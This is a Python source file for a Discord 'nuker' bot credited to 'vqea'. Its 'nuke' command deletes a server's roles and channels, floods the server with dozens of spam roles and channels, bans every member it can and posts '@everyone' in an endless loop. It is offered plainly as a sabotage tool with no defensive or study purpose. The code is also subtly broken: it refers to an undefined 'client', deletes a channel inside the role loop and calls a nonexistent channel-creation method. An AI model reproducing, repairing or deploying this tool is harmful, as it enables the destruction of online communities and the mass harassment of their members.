import discord, os, asyncio, random
from discord.ext import commands
from colorama import Fore, Style

os.system('pip install discord')
os.system('pip install colorama')

token = input(f"token: ")
prefix = input(f"prefix: ")
owner = input(f"your id: ")

channel = "nuked"
message = "@everyone nuked by vqea" 

nuker = commands.Bot(command_prefix=prefix)


@nuker.event
async def on_ready():
   await nuker.change_presence(activity=discord.Game(name="github/vqea"))
   print(f"""                                     _             
          __   ____ _  ___  __ _      _ __  _   _| | _____ _ __ 
          \ \ / / _` |/ _ \/ _` |    | '_ \| | | | |/ / _ \ '__|
           \ V / (_| |  __/ (_| |    | | | | |_| |   <  __/ |   
            \_/ \__, |\___|\__,_|    |_| |_|\__,_|_|\_\___|_|   
                   |_| 
         ----------------------------------------------------------
         -------------------- logged in as {nuker.user} -----------
         -------------------- prefix : {prefix} -------------------
         -------------------- type '{prefix}nuke' to start nuking -
         """)
 
  
@nuker.command()
async def stop(ctx):
  await ctx.reply("logging out...")
  await nuker.close()


@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(message)
  
  
@nuker.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
  
    print(f"nuking {guild.name} in")
    print(f"3...")
    await asyncio.sleep(1)
    print(f"2...")
    await asyncio.sleep(1)
    print(f"1...")

    for role in guild.roles:
      try:
        await channel.delete()
        print(Fore.GREEN + f"@{role.name} was deleted" + Fore.RESET)
      except:
        continue

    for x in range(50):
      try:
        await guild.create_role(name="nuked by vqea")
      except:
        continue    
    
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.GREEN + f"#{channel.name} was deleted" + Fore.RESET)
      except:
        continue

    for x in range(50):
      try:
        await guild.create_channel(name="vqea-on-top")
      except:
        continue

    for member in guild.members:
      try:
        await member.ban(reason="loser")
        print(Fore.GREEN + f"@{member} was banned" + Fore.RESET)
      except:
        continue
        
    print("successfully nuked {guild.name}")
    return
     
    
nuker.run(token) 
